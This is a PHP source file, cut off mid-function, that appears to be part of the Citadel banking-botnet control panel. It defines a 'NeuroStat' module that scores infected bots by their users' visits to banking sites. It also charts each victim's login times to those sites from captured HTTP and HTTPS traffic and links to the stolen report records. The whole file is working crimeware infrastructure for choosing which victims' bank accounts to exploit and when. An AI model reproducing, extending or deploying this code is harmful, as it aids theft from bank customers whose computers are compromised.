<?php
require_once 'system/lib/global.php';
require_once 'system/lib/dbpdo.php';
require_once 'system/lib/amiss/amiss.php';
require_once 'system/lib/guiutil.php';
require_once 'system/lib/FormBuilder/FormBuilder.php';

require_once 'system/lib/fun/neurostat/neurostat.php';

use Citadel\Models;
use lib\fun\NeuroStat\Criteria;

class reports_neurostatController {
    function __construct(){
        $this->db = dbPDO::singleton();
        $this->amiss = Amiss::singleton();
    }

    function actionIndex(){
        ThemeBegin(LNG_MM_REPORTS_NEUROSTAT, 0, getBotJsMenu('botmenu'), 0);

        $this->_blockAnalysesList();
        $this->_blockProfilesList();
        $this->_blockCriteriaList();

        echo <<<HTML
        <link rel="stylesheet" href="theme/js/contextMenu/src/jquery.contextMenu.css" />
        <script src="theme/js/contextMenu/src/jquery.contextMenu.js"></script>
        <script src="theme/js/contextMenu/src/jquery.ui.position.js"></script>

        <script src="theme/js/page-reports_neurostat-analyzer.js"></script>
HTML;
        ThemeEnd();
    }

    #region Ranking NeuroStat

    #region CRUDs
    /** BLOCK: List of analyses
     */
    protected function _blockAnalysesList(){
        $man = $this->amiss->man;

        /** @var Models\NeurostatAnalysis[] $analyses */
        $analyses = $man->getList('NeurostatAnalysis', '{single_botid} IS NULL');
        echo '<table class="zebra lined crud" id="neurostat_analyses">',
            '<caption>', LNG_NEUROSTAT_ANALYSESLIST,
                '<a class="add-new ajax_colorbox" href="?m=reports_neurostat/crudAnalysis&id=0">', LNG_NEUROSTAT_ANALYSESLIST_ADD, '</a>', '</caption>',
            '<THEAD><tr>',
                '<th>', LNG_NEUROSTAT_ANALYSESLIST_TH_NAME, '</th>',
                '<th>', LNG_NEUROSTAT_ANALYSESLIST_TH_DAYS, '</th>',
                '<th>', LNG_NEUROSTAT_ANALYSESLIST_TH_BOTONLINE, '</th>',
                '<th>', LNG_NEUROSTAT_ANALYSESLIST_TH_ACCOUNT, '</th>',
                '<th>', LNG_NEUROSTAT_ANALYSESLIST_TH_PROFILES, '</th>',
                '<th>', LNG_NEUROSTAT_ANALYSESLIST_TH_DATES, '</th>',
                '<th>', LNG_NEUROSTAT_ANALYSESLIST_TH_BOTS, '</th>',
                '<th>', LNG_NEUROSTAT_ANALYSESLIST_TH_LAUNCHED, '</th>',
                '<th>', LNG_NEUROSTAT_ANALYSESLIST_TH_STATE, '</th>',
                '</tr></THEAD>',
            '<TBODY>';
        foreach ($analyses as $a){
            $classes = array();

            # Remake report references to dates
            $dates = array(
                empty($a->report_first)? '?' : $a->report_first[0],
                empty($a->report_last)? '?' : $a->report_last[0],
            );
            # Profile names
            $profile_names = array_pluck('name', $a->profiles($man));
            # Matched bots
            $bots_count = $this->db->query(
                'SELECT
                    COUNT(`nab`.`bid`)
                 FROM `neurostat_analysis_bots` `nab`
                    LEFT JOIN `botnet_list` `bl` ON(`nab`.`botId` = `bl`.`bot_id`)
                 WHERE
                    `nab`.`aid`=:aid AND
                    /*`nab`.`points` IS NOT NULL AND*/
                    (:rtime_last IS NULL OR `bl`.`rtime_last` >= :rtime_last)
                ;', array(
                ':aid' => $a->aid,
                ':rtime_last' => is_null($a->botonline)? null : ( time() - 60*60*24*$a->botonline )
            ))->fetchColumn();
            # Launched state
            if (is_null($a->launched))
                $launched = LNG_NEUROSTAT_ANALYSESLIST_LAUNCHED_NEVER;
            else
                $launched = sprintf(
                    '<span title="%s">%s</span>',
                    $a->launched->format('d.m.Y H:i:s'),
                    timeago(time() - $a->launched->getTimestamp())
                );

            if (is_null($a->launched))
                $launched_state = LNG_NEUROSTAT_ANALYSESLIST_LAUNCHED_NEVER;
            elseif (is_null($a->state))
                $launched_state = LNG_NEUROSTAT_ANALYSESLIST_LAUNCHED_IDLE;
            else{
                $launched_state = $a->state->toHtml();
                if ( $a->state->isAlive() )
                    $classes[] = 'running';
            }
            # Classes
            if (!is_null($a->launched) && is_null($a->state)) # launched, and not running
                $classes[] = 'finished';
            # Title
            $title = htmlspecialchars($a->name);
            if (in_array('finished', $classes)) # launched, and not running
                $title = "<a href='?m=reports_neurostat/analysisResults&aid={$a->aid}'>{$title}</a>";

            echo '<tr data-aid="', $a->aid, '" data-ajax-edit="?m=reports_neurostat/crudAnalysis&id='.$a->aid.'" class="', implode(' ', $classes), '">',
                '<th>', $title, '</th>',
                '<td>', $a->days, $a->notoday? LNG_NEUROSTAT_ANALYSESLIST_DAYS_NOTODAY : '', '</td>',
                '<td>', $a->botonline, '</td>',
                '<td>',
                    empty($a->account['urls'])
                        ? ''
                        : implode('<br>', array_map(function($url){
                            # Try to extract the hostname
                            preg_match('~([a-z0-9\.\*\?]+\.[a-z0-9\.\*\?]+)~iS', $url, $m);
                            return $m[0];
                    }, $a->account['urls'])),
                    '</td>',
                '<td>', htmlspecialchars(implode(', ', $profile_names)), '</td>',
                '<td>', implode(' - ', $dates), '</td>',
                '<td>', (int)$bots_count, '</td>',
                '<td>', $launched, '</td>',
                '<td>', $launched_state, '</td>',
                '</tr>';
        }
        echo
            '</TBODY>',
            '</table>';
    }

    /** AJAX, CRUD: Analysis
     * @param int|null $id
     * @param bool $reset
     * @param bool $delete
     * @throws ActionException
     */
    function actionCrudAnalysis($id = null, $reset = false, $delete = false){
        $man = $this->amiss->man;

        # Delete, Reset
        $q_data = array( ':aid' => $id );
        if ($delete || $reset){
            $this->db->query('DELETE FROM `neurostat_analysis_bots` WHERE `aid`=:aid;', $q_data);
            $this->db->query('DELETE FROM `neurostat_analysis_data` WHERE `aid`=:aid;', $q_data);
        }
        if ($delete)
            return $man->deleteByPk('NeurostatAnalysis', $id) or null;
        if ($reset){
            $this->db->query(
                'UPDATE `neurostat_analyses`
                 SET
                    `launched`=NULL, `state`=NULL,
                    `report_first`=NULL, `report_last`=NULL
                 WHERE `aid`=:aid
                ;', $q_data);
            return null;
        }

        # Create/Update
        $c = $id? $man->getByPk('NeurostatAnalysis', $id) : new Models\NeurostatAnalysis;
        if (!$c)
            throw new ActionException('Entity not found');

        # Preprocess
        $c->account['urls'] = empty($c->account['urls'])? '' : implode("\n", $c->account['urls']);

        # Form ...
        $fb = new FormBuilder;
        $form = $fb->form('?m=reports_neurostat/crudAnalysis&id='.urlencode($id), 'POST') /** @var \FormBuilder\Tag\Form\Form $form */
            ->addClass('crud')
            ->id('crud-analysis');

        $dl = $form->dl();
        $dl ->dt()->addText(LNG_NEUROSTAT_ANALYSIS_NAME)->up()
            ->dd()->inputText('analysis[name]')->required()->attr('size', 100);
        $dl ->dt()->addText(LNG_NEUROSTAT_ANALYSIS_PROFILES)->up()
            ->dd()->ul()->inputCheckboxes('analysis[profiles][%s]')->options($c::profiles_options($man), new \FormBuilder\Tag\Tag('li'));
        $dl ->dt()->addText(LNG_NEUROSTAT_ANALYSIS_DAYS)->up()
            ->dd()->inputNumber('analysis[days]')->description(LNG_NEUROSTAT_ANALYSIS_DAYS_DESCR)->up()
            ->br()->label()->inputDefaultCheckbox('analysis[notoday]', 1, 0)->description(LNG_NEUROSTAT_ANALYSIS_NOTODAY_LABEL)->addText(LNG_NEUROSTAT_ANALYSIS_NOTODAY);
        $dl ->dt()->addText(LNG_NEUROSTAT_ANALYSIS_BOTONLINE)->up()
            ->dd()->inputNumber('analysis[botonline]')->description(LNG_NEUROSTAT_ANALYSIS_BOTONLINE_DESCR)->hint(LNG_NEUROSTAT_ANALYSIS_BOTONLINE_HINT);
        $dl ->dt()->addText(LNG_NEUROSTAT_ANALYSIS_ACCOUNT)->up()
            ->dd()->dl()
                ->dt()->addText(LNG_NEUROSTAT_ANALYSIS_ACCOUNT_URLS)->up()
                ->dd()->textarea('analysis[account][urls]', 90, 7)->description(LNG_NEUROSTAT_ANALYSIS_ACCOUNT_URLS_DESCR)->placeholder('htt?://*.bank.com/*');

        $form->button('submit', $id? LNG_NEUROSTAT_ANALYSIS_BUTTON_UPDATE : LNG_NEUROSTAT_ANALYSIS_BUTTON_CREATE);
        $form->bindStorage($c, '^analysis')->bindRequest($_REQUEST);
        $form->javascriptSupport()->hints()->descriptions();

        if ($_SERVER['REQUEST_METHOD'] === 'POST'){
            if (empty($c->botonline))
                $c->botonline = null;
            # Preprocess
            unset($c->account['url']); # old stuff
            $c->account['urls'] = array_filter(array_map('trim', explode("\n", $c->account['urls'])));
            return $man->save($c) or null;
        }

        echo $form->render();
    }

    /** BLOCK: List of profiles
     */
    protected function _blockProfilesList(){
        $man = $this->amiss->man;

        /** @var Models\NeurostatProfile[] $profiles */
        $profiles = $man->getList('NeurostatProfile');

        echo '<table class="zebra lined crud" id="neurostat_profiles">',
            '<caption>', LNG_NEUROSTAT_PROFILE_LIST,
                '<a class="add-new ajax_colorbox" href="?m=reports_neurostat/crudProfile&id=0">', LNG_NEUROSTAT_PROFILE_LIST_ADD, '</a>', '</caption>',
            '<THEAD><tr>',
                '<th>', LNG_NEUROSTAT_PROFILE_LIST_TH_NAME, '</th>',
                '<th>', LNG_NEUROSTAT_PROFILE_LIST_TH_CRITERIA, '</th>',
            '</tr></THEAD>';
        echo '<TBODY>';
        foreach ($profiles as $p){
            $criteria = $p->criteria($man);
            $criteria_names = array_pluck('title', $criteria);

            echo '<tr data-ajax-edit="?m=reports_neurostat/crudProfile&id='.$p->pid.'">',
                '<th>', htmlspecialchars($p->name), '</th>',
                '<td>', htmlspecialchars(implode(', ', $criteria_names)), '</td>',
                '</tr>';
        }
        echo '</TBODY></table>';
    }

    /** AJAX, CRUD: Profile
     * @param int|null $id
     * @param bool $delete
     * @throws ActionException
     */
    function actionCrudProfile($id = null, $delete = false){
        $man = $this->amiss->man;

        # Delete
        if ($delete)
            return $man->deleteByPk('NeurostatProfile', $id) or null;

        # Create/Update
        $c = $id? $man->getByPk('NeurostatProfile', $id) : new Models\NeurostatProfile;
        if (!$c)
            throw new ActionException('Entity not found');

        # Form ...
        $fb = new FormBuilder;
        $form = $fb->form('?m=reports_neurostat/crudProfile&id='.urlencode($id), 'POST') /** @var \FormBuilder\Tag\Form\Form $form */
            ->addClass('crud')
            ->id('crud-profile');

        $dl = $form->dl();
        $dl ->dt()->addText(LNG_NEUROSTAT_PROFILE_NAME)->up()
            ->dd()->inputText('profile[name]')->required()->attr('size', 100);
        $dl ->dt()->addText(LNG_NEUROSTAT_PROFILE_CRITERIA)->up()
            ->dd()->ul()->inputCheckboxes('profile[criteria][%s]')->options($c::criteria_options($man), new \FormBuilder\Tag\Tag('li'));

        $form->button('submit', $id? LNG_NEUROSTAT_PROFILE_BUTTON_UPDATE : LNG_NEUROSTAT_PROFILE_BUTTON_CREATE);
        $form->bindStorage($c, '^profile')->bindRequest($_REQUEST);
        $form->javascriptSupport()->hints()->descriptions();

        if ($_SERVER['REQUEST_METHOD'] === 'POST')
            return $man->save($c) or null;

        echo $form->render();
    }

    /** BLOCK: List of criteria
     */
    protected function _blockCriteriaList(){
        $man = $this->amiss->man;

        /** @var Models\NeurostatCriterion[] $criteria */
        $criteria = $man->getList('NeurostatCriterion', array('order'=>'title'));

         echo '<table class="zebra lined crud" id="neurostat_criteria">',
            '<caption>', LNG_NEUROSTAT_CRITERIA_LIST,
                '<a class="add-new ajax_colorbox" href="?m=reports_neurostat/crudCriterion&id=0">', LNG_NEUROSTAT_CRITERIA_LIST_ADD, '</a>', '</caption>',
            '<THEAD><tr>',
                '<th>', LNG_NEUROSTAT_CRITERIA_LIST_TH_TITLE, '</th>',
                '<th>', LNG_NEUROSTAT_CRITERIA_LIST_TH_SETUP, '</th>',
                '<th>', LNG_NEUROSTAT_CRITERIA_LIST_TH_DAYS_LIMIT, '</th>',
                '<th>', LNG_NEUROSTAT_CRITERIA_LIST_TH_POINTS, '</th>',
                '<th>', LNG_NEUROSTAT_CRITERIA_LIST_TH_STATISTICAL_METHOD, '</th>',
            '</tr></THEAD>';
        echo '<TBODY>';
        foreach ($criteria as $c){
            $criterion = $c->getCriterion($man);

            echo '<tr data-ajax-edit="?m=reports_neurostat/crudCriterion&id='.$c->cid.'">',
                '<th>', htmlspecialchars($c->title), '</th>',
                '<td>', htmlspecialchars((string)$criterion), '</td>',
                '<td>', $c->days_limit, '</td>',
                '<td>', $c->points, '</td>',
                '<td>', $c->c_stat? "{$c->c_stat} {$c->c_operator} {$c->c_threshold}" : LNG_NEUROSTAT_CRITERIA_LIST_EACH, '</td>',
                '</tr>';
        }
        echo '</TBODY></table>';
    }

    /** AJAX, CRUD: Criterion
     * @param int|null $id
     * @param string|null $type
     *      Criterion type to update the type-dependent part of the form.
     *      When specified, the form is never saved.
     * @param bool $delete
     * @throws ActionException
     */
    function actionCrudCriterion($id = null, $type = null, $delete = false){
        $man = $this->amiss->man;

        # Delete
        if ($delete){
            $this->db->query('DELETE FROM `neurostat_analysis_data` WHERE `cid`=:cid;', array(':cid' => $id));
            return $man->deleteByPk('NeurostatCriterion', $id) or 0;
        }

        # Create/Update
        $c = $id? $man->getByPk('NeurostatCriterion', $id) : new Models\NeurostatCriterion;
        if (!$c)
            throw new ActionException('Entity not found');
        if (empty($c->type) && !empty($type))
            $c->type = $type; # Prepare
        if (!empty($_POST['criterion']['type']))
            $c->type = $_POST['criterion']['type'];

        # Form ...
        $fb = new FormBuilder;
        $form = $fb->form('?m=reports_neurostat/crudCriterion&id='.urlencode($id), 'POST') /** @var \FormBuilder\Tag\Form\Form $form */
            ->addClass('crud')
            ->id('crud-criterion');
        $dl = $form->dl();
        $dl ->dt()->addText(LNG_NEUROSTAT_CRITERION_TITLE)->up()
            ->dd()->inputText('criterion[title]')->description(LNG_NEUROSTAT_CRITERION_TITLE_HINT)->required()->attr('size', 100);
        $dl ->dt()->addText(LNG_NEUROSTAT_CRITERION_TYPE)->up()
            ->dd()->select('criterion[type]')->options(array(null => '') + $c::type_options())->description(LNG_NEUROSTAT_CRITERION_TYPE_HINT)->required();

        # Depending on $c->type, pick a form option
        $c_root = $dl->dt()->addText(LNG_NEUROSTAT_CRITERION_SETS)->up()->dd()->addClass('criterion-sets');
        if (!$c->type)
            $c_root->div()->addClass('warning')->addText(LNG_NEUROSTAT_CRITERION_SETS_UNDEFINED);
        else {
            $criterion = $c->getCriterion($man); /** @var \lib\fun\NeuroStat\Criteria\ACriterion $criterion */
            $c_root->addText($criterion::DESCR);
            $criterion->settingsForm($c_root->dl()); # into a sub-list
        }

        # ... Continue with common settings
        $dl ->dt()->addText(LNG_NEUROSTAT_CRITERION_DAYSLIMIT)->up()
            ->dd()->inputNumber('criterion[days_limit]')->description(LNG_NEUROSTAT_CRITERION_DAYSLIMIT_HINT);
        $dl ->dt()->addText(LNG_NEUROSTAT_CRITERION_NEGATED)->up()
            ->dd()->inputDefaultCheckbox('criterion[negated]', 1, 0)->description(LNG_NEUROSTAT_CRITERION_NEGATED_HINT);
        $dl ->dt()->addText(LNG_NEUROSTAT_CRITERION_POINTS)->up()
            ->dd()->inputNumber('criterion[points]')->description(LNG_NEUROSTAT_CRITERION_POINTS_HINT);
        $dl ->dt()->addText(LNG_NEUROSTAT_CRITERION_STAT.', '.LNG_NEUROSTAT_CRITERION_OPERATOR_THRESHOLD)->up()
            ->dd()
                ->select('criterion[c_stat]')->options($c::c_stat_options())->description(LNG_NEUROSTAT_CRITERION_STAT_HINT)->up()
                ->select('criterion[c_operator]')->options($c::c_operator_options())->up()
                ->inputNumber('criterion[c_threshold]')->description(LNG_NEUROSTAT_CRITERION_OPERATOR_THRESHOLD_HINT)->attr('size', 5);
            ;
        $form->button('submit', $id? LNG_NEUROSTAT_CRITERION_BUTTON_UPDATE : LNG_NEUROSTAT_CRITERION_BUTTON_CREATE);
        $form->bindStorage($c, '^criterion');
        $form->bindRequest($_REQUEST);
        $form->javascriptSupport()->hints()->descriptions();

        if (is_null($type) && $_SERVER['REQUEST_METHOD'] === 'POST'){
            $man->save($c);
//            header('Location: ?m=reports_neurostat/crudCriterion&id='.$c->cid);
            return;
        }

        echo $form->render();
    }
    #endregion

    /** AJAX: run the specified analysis on a single BotID
     * This creates a virtual analysis and invokes actionAjaxAnalysisRun() on it.
     * @param int $aid The analysis to run
     * @param string $botId The bot to analyze
     */
    function actionAjaxAnalyzeSingleBot($aid, $botId){
        $man = $this->amiss->man;

        # Reuse any previous analysis if available
        $prev_a = $man->get('NeurostatAnalysis', '{single_botid}=?', $botId);

        # Create a virtual analysis
        $a = $man->getByPk('NeurostatAnalysis', $aid); /** @var Models\NeurostatAnalysis $a */
        if (!$a)
            throw new ActionException('Entity not found');
        $a->aid = $prev_a? $prev_a->aid : null; # reuse
        $a->name = '';
        $a->single_botid = $botId;
        $a->account = null;
        $a->launched = $a->state = $a->report_last = $a->report_first = null;

        # Store it
        $man->save($a);

        # Run analysis on it
        $this->actionAjaxAnalysisRun($a->aid);
    }

    /** AJAX: run analysis
     * @param int $aid Analysis id
     */
    function actionAjaxAnalysisRun($aid){
        ignore_user_abort(true);
        set_time_limit(60*60*5);
        session_write_close();

        $start_tm = time();

        $man = $this->amiss->man;
        $this->db->query('SET low_priority_updates=1;');
        $this->db->query('SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;');

        # Load analysis
        $analysis = $man->getByPk('NeurostatAnalysis', $aid); /** @var Models\NeurostatAnalysis $analysis */
        if (!$analysis)
            throw new ActionException('Analysis not found');

        # Prepare the processor
        $processor = $analysis->getAnalysisProcessor();
        $processor
            ->init($this->db, $man)
            ->load()
            ->prepare();

        # Analyze
        $processor
            ->analyzeBots()
            ->rankBots()
            ->finish();

        if (!headers_sent()){
            # Analysis results link
            $analysis_results_link = '?m=reports_neurostat/analysisResults&aid='.$analysis->aid;

            # Restart the session to issue flash message
            $delta_tm = time() - $start_tm;
            if ($delta_tm >= 10){
                session_start();
                flashmsg('info',
                    $analysis->single_botid
                        ? LNG_NEUROSTAT_ANALYSIS_BOTID_FINISHED
                        : LNG_NEUROSTAT_ANALYSIS_FINISHED,
                    array(
                    ':analysis_name' => $analysis->name,
                    ':analysis_link' => $analysis_results_link,
                    ':time' => timeago($delta_tm, null, true),
                    ':botId' => $analysis->single_botid,
                ));
            }

            # Drive to the analysis results page
            header("X-Location: $analysis_results_link");
        }

        # Log
        if ($processor->_logger)
            echo $processor->_logger;
    }

    /** Page: display analysis results
     * @param int $aid
     */
    function actionAnalysisResults($aid){
        $man = $this->amiss->man;

        $analysis = $man->getByPk('NeurostatAnalysis', $aid); /** @var Models\NeurostatAnalysis $analysis */
        if (!$analysis)
            throw new ActionException('Entity not found');

        ThemeBegin(LNG_MM_REPORTS_NEUROSTAT.' :: '.htmlspecialchars($analysis->name), 0, getBotJsMenu('botmenu'), 0);

        $q = $this->db->query(
            'SELECT
                `nab`.`botId`,
                `nab`.`bid`,
                `nab`.`accounts`,
                `nab`.`points`,
                MIN(`nad`.`date`) AS `date_a`,
                MAX(`nad`.`date`) AS `date_b`,
                SUM(`nad`.`reports_count`) AS `reports_count`
             FROM `neurostat_analysis_bots` `nab`
                LEFT JOIN `botnet_list` `bl` ON(`nab`.`botId` = `bl`.`bot_id`)
                LEFT JOIN `neurostat_analysis_data` `nad` ON(`nab`.`aid` = `nad`.`aid` AND `nab`.`bid`=`nad`.`bid`)
             WHERE
                `nab`.`aid`=:aid AND
                /*`nab`.`points` IS NOT NULL AND*/
                (:rtime_last IS NULL OR `bl`.`rtime_last` >= :rtime_last)
             GROUP BY
                `nab`.`bid`
             ORDER BY
                `nab`.`points` DESC
            ;', array(
            ':aid' => $aid,
            ':rtime_last' => is_null($analysis->botonline)? null : ( time() - 60*60*24*$analysis->botonline )
        ));

        echo '<table class="zebra lined" id="analysis-results">',
            '<caption>',
            $analysis->name,
            '</caption>',
            '<THEAD><tr>',
            '<th>', 'BotId', '</th>',
            '<th>', 'Points', '</th>',
            '<th>', 'Reports', '</th>',
            '<th>', 'Dates', '</th>',
            '<th>', 'Accounts', '</th>',
            '</tr></THEAD>',
            '<TBODY>';
        while ($row = $q->fetchObject()){
            echo '<tr>',
                '<th>', botPopupMenu($row->botId, 'botmenu'), '</th>',
                '<td class="points">', $row->points, '</td>',
                '<td>',
                    '<a href="?m=reports_neurostat/analysisResultsBot&aid=', $analysis->aid, '&bid=', $row->bid, '" target="_blank">', $row->reports_count, '</a>',
                    '</td>',
                '<td>', $row->date_a, ' — ', $row->date_b, '</td>';
            echo '<td class="reports"><ul>';
            if ($row->accounts)
                foreach (unserialize($row->accounts) as $account_mask => $report_ref){
                    preg_match('~([a-z0-9\.\*\?]+\.[a-z0-9\.\*\?]+)~iS', $account_mask, $m);
                    $account_title = $m[0];
                    echo '<li>',
                        sprintf(
                            '<a href="?m=reports_neurostat/URLplot&botId=%s&url=%s" target="_blank"><img src="images/icon-reports_neurostat.gif" /></a>',
                            urlencode($row->botId),
                            urlencode($account_mask)
                        ),
                        ' ',
                        $this->report_url($report_ref, 'brief', $account_title)
                    ;
                }
            echo '</ul></td>';
            echo '</tr>';
        }
        echo '</table>';

        echo <<<HTML
            <script src="theme/js/page-reports_neurostat-analyzer-results.js"></script>
HTML;

        ThemeEnd();
    }

    /** Page: display detailed analysis results for a single bot
     * @param int $aid
     * @param int $bid
     */
    function actionAnalysisResultsBot($aid, $bid){
        $man = $this->amiss->man;

        # Load bot info & Analysis
        /** @var Models\NeurostatAnalysisBot $bot */
        $bot = $man->get('NeurostatAnalysisBot', 'aid=? AND bid=?', $aid, $bid);
        $man->assignRelated($bot, 'analysis');

        if (!$bot)
            throw new ActionException('Entity not found');

        # Display
        ThemeBegin(LNG_MM_REPORTS_NEUROSTAT.' :: '.htmlspecialchars($bot->analysis->name), 0, getBotJsMenu('botmenu'), 0);

        # Load all participating criteria to build a table of cids
        $this->db->query(
            'CREATE TEMPORARY TABLE `_csort` (
                `cid` INT UNSIGNED NOT NULL,
                `n` INT UNSIGNED NOT NULL,
                PRIMARY KEY(`cid`),
                INDEX(`n`)
            );'
        );
        $this->db->query(
            'INSERT INTO `_csort`
             SELECT `cid`, COUNT(*) AS `n`
             FROM `neurostat_analysis_data`
             WHERE `aid`=:aid AND `bid`=:bid
             GROUP BY `cid`
             ORDER BY `n` DESC
            ', array(
                ':aid' => $aid,
                ':bid' => $bid,
            ));

        $analysis_cids = $this->db->query(
            'SELECT `cid`
             FROM `_csort`
             ORDER BY `n` DESC
             ;')->fetchAll(\PDO::FETCH_COLUMN);

        /** @var Models\NeurostatCriterion[] $analysis_criteria */
        $analysis_criteria = $man->getList('NeurostatCriterion', '{cid} IN (:cids)', array(':cids' => $analysis_cids ) );

        usort($analysis_criteria, function($a, $b){
            if ($a->cid == $b->cid)
                return 0;
            return ($a->cid > $b->cid)? 1 : -1;
        });

        # Fetch data
        $q = $this->db->query(
            'SELECT `date`, `cid`, `reports`
             FROM `neurostat_analysis_data`
                LEFT JOIN `_csort` USING(`cid`)
             WHERE `aid`=:aid AND `bid`=:bid
             ORDER BY `date` ASC, `_csort`.`n` DESC
             ;', array(
            ':aid' => $aid,
            ':bid' => $bid,
        ));

        # Table
        echo '<table class="zebra lined" id="analysis-results-bot">',
            '<THEAD>';
        echo '<tr class="criterion"><th rowspan=3>Date</th>';
        foreach ($analysis_criteria as $criterion)
            echo '<td>', htmlspecialchars($criterion->title), '</b>', '</td>';
        echo '</tr>';
        echo '<tr class="points">';
        foreach ($analysis_criteria as $criterion)
            echo '<td>', isset($bot->details[$criterion->cid])? "<strong>{$bot->details[$criterion->cid]}</strong> points" : '-', '</td>';
        echo '</tr>';
        echo '<tr class="criterion-str">';
        foreach ($analysis_criteria as $criterion)
            echo '<td>', '<small>', htmlspecialchars($criterion->getCriterion($man)), '</small>', '</td>';
        echo '</tr>';
        echo '</THEAD>',
            '<TBODY>';

        $last_date = null;
        $accum = array();
        while (($row = $q->fetchObject()) || true){
            # New date
            if (!$row || $row->date !== $last_date){
                # Spit
                if (!empty($accum)){
                    echo '<tr>';
                    echo '<th>', $last_date, '</th>';
                    foreach ($analysis_criteria as $criterion)
                        if (empty($accum[$criterion->cid]))
                            echo '<td>-</td>';
                        else {
                            $r = $accum[$criterion->cid];
                            echo '<td><ul>';
                            foreach (array_filter(explode("\n", $r->reports)) as $report)
                                echo '<li>', $this->report_url($report, 'brief'), '</li>';
                            echo '</td>';
                        }
                    echo '</tr>';
                }

                # Reset
                if (!$row)
                    break;
                $accum = array();
                $last_date = $row->date;
            }
            # Accumulate
            $accum[$row->cid] = $row;
        }
        echo '</table>';

        echo <<<HTML
            <script src="theme/js/page-reports_neurostat-analyzer-results.js"></script>
HTML;


        ThemeEnd();
    }

    #endregion






    #region Plots
    protected function report_url($report, $viewmode='brief', $title = null){
        if (empty($report))
            return null;
        if (empty($title))
            $title = $report;
        $report_url = '?m=reports_db&t='.str_replace(':', '&id=', $report);
        return "<a href='{$report_url}&viewmode={$viewmode}'>{$title}</a>";
    }

    const TIME_ROUND_PERIOD = 30; # minutes rouding: time granularity

    /** Round the time components, providing granularity
     * @param int $h
     * @param int $m
     */
    protected function _roundTime(&$h, &$m){
        $m = round($m/self::TIME_ROUND_PERIOD)*self::TIME_ROUND_PERIOD;
        if ($m >= 60){
            $m = 0;
            if (++$h > 23)
                $h = 0;
        }
    }

    /** Format time from components
     * @return string
     */
    protected function _fmtTime($h, $m){
        return sprintf("%d:%02d", $h, $m);
    }

    /** Display 3 plots, telling how frequent a BotID visits the specified URL
     * @param string $botId
     * @param string $url
     */
    function actionUrlPlot($botId, $url){
        ThemeBegin(LNG_MM_REPORTS_NEUROSTAT, 0, getBotJsMenu('botmenu'), 0);

        # Display a form so the user can edit
        echo '<form method="GET">',
            '<input type="hidden" name="m" value="reports_neurostat/urlplot" />',
            '<dl>',
                '<dt>BotID</dt>',
                    '<dd>', '<input type="text" name="botId" value="', htmlspecialchars($botId), '" size=100 />', '</dd>',
                '<dt>URL mask</dt>',
                    '<dd>', '<input type="text" name="url" value="', htmlspecialchars($url), '" placeholder="*://*login.bank.com/*" size=100 />', '</dd>',
                '</dl>',
            '<input type="submit" value="Neuromodel" />',
            '</form>';

        # Prepare the stats
        $firstlogins = array(); # { date: time } of first logins per day
        $scattertime = array(); # { date : [time, time, time]} for the scatterplot
        $calendarstat = array(); # { Y-m-d: count }
        $calendarstat_max = 0; # max per day

        $timestat = array(); # { round(time) : count } for the stats
        $firstloginstat = array(); # { round(time) : count } for the first login stats

        for ($h = 0, $m=0; ($h*$m)<(60*24); $m += self::TIME_ROUND_PERIOD){
            if ($m >= 60){
                $m = 0;
                $h += 1;
            }
            $t = $this->_fmtTime($h, $m);
            $timestat[ $t ] = 0;
            $firstloginstat[ $t ] = 0;
        }

        # Collect the data
        foreach ($this->db->report_tables() as $yymmdd => $table){
            $q = $this->db->query(
                'SELECT
                    (`r`.`time_system` + `r`.`time_localbias`) AS `t`,
                    HOUR(FROM_UNIXTIME(`r`.`time_system` + `r`.`time_localbias`)) AS `hour`,
                    MINUTE(FROM_UNIXTIME(`r`.`time_system` + `r`.`time_localbias`)) AS `minute`
                 FROM `'.$table.'` `r`
                 WHERE
                    `r`.`type` IN(:type_http, :type_https) AND
                    `r`.`bot_id` = :botId AND
                    `r`.`path_source` REGEXP BINARY :url_mask
                ;', array(
                ':type_http' => BLT_HTTP_REQUEST,
                ':type_https' => BLT_HTTPS_REQUEST,
                ':botId' => $botId,
                ':url_mask' => '^'.wildcart_body($url)
            ));

            $prev_point = 0;
            while ($r = $q->fetchObject()){
                $date = date('Y-m-d', $r->t);
                $time = $this->_fmtTime($r->hour, $r->minute);

                // Round the time
                $rnd_hour = $r->hour;
                $rnd_min  = $r->minute;
                $this->_roundTime($rnd_hour, $rnd_min);
                $rnd_time = $this->_fmtTime($rnd_hour, $rnd_min);

                // $firstlogins, $firstloginstat
                if (!isset($firstlogins[$date])){
                    $firstlogins[$date] = $time;
                    $firstloginstat[$rnd_time] += 1;
                }

                // $scattertime: store times for the scatterplot
                if (($r->t - $prev_point) > (60*self::TIME_ROUND_PERIOD)){ # don't display points that are too close to each other
                    $scattertime[] = array((int)$r->t, $r->hour*60 + $r->minute);
                    $prev_point = $r->t;
                }

                // $timestat: store rounded time
                if (!isset($timestat[$rnd_time]))
                    $timestat[$rnd_time] = 1;
                else
                    $timestat[$rnd_time] += 1;

                // $datesstat: store {m d n} object
                if (!isset($calendarstat[$date]))
                    $calendarstat[$date] = (object)array(
                        'm' => date('m', $r->t), 'd' => date('d', $r->t), 'y' => date('Y', $r->t),
                        'hits' => 0,
                        't1' => date('H:i', $r->t),
                        't2' => date('H:i', $r->t),
                        'h1' => date('H', $r->t),
                        'h2' => date('H', $r->t),
                    );
                $calendarstat[$date]->hits++;
                $calendarstat[$date]->t2 = date('H:i', $r->t);
                $calendarstat[$date]->h2 = date('H', $r->t);

                // $datesstat_maxperday
                if ($calendarstat[$date]->hits > $calendarstat_max)
                    $calendarstat_max = $calendarstat[$date]->hits;
            }
        }

        # Export data to JSON
        echo jsonset(array(
            'window.data' => new stdClass(),
            'window.data.firstlogins' => $firstlogins,
            'window.data.scattertime' => $scattertime,
            'window.data.timestat' => $timestat,
            'window.data.firstloginstat' => $firstloginstat,
        ));

        # Display
        $logincount = array_sum($timestat);
        echo <<<HTML

        <h2>Login stat using $logincount entries</h2>

        <div id="firstloginstat"></div>
        <div id="timestat"></div>
        <div id="scattertime"></div>

        <script src="theme/js/highcharts/js/highcharts.js"></script>
        <script src="theme/js/page-reports_neurostat.js"></script>
HTML;

        # Calendar stat
        echo '<h2>Calendar Stat</h2>';
        echo '<div id="calendarstat">';
        $months = array();
        foreach ($calendarstat as $ymd => $r)
            $months["{$r->y}.{$r->m}"] = $r;

        echo '<ul id="calendars">';

        $r = reset($calendarstat);
        foreach ($months as $m){
            $m->time = mktime(0,0,0, $m->m, 1, $m->y);
            $m->dow = date('N', $m->time);
            $m->days = date('t', $m->time);

            # Month: Heading
            echo '<li>',
